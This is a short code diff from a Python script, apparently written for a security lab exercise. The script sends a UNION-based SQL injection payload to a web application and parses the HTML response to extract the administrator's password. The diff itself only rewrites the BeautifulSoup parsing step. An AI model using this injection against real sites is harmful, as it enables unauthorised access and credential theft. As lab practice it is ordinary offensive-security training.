@@ -21,9 +21,16 @@ def find_credentials(s, url):
     payload_list = "'UNION+select+username,password+from+users--"
     res = s.get(url+path+payload_list,verify=False, proxies=proxies)
     soup = BeautifulSoup(res.text, 'html.parser')
+    '''
     th_tag = soup.find('th', string='administrator')
     td_tag = th_tag.find_next('td')
     password = td_tag.get_text(strip=True)
+
+    or
+    password = soup.find('th', string='administrator').find_next('td').get_text(strip=True)
+
+    '''
+    password = soup.body.find(string="administrator").parent.findNext('td').contents[0] 
     return password
     
 
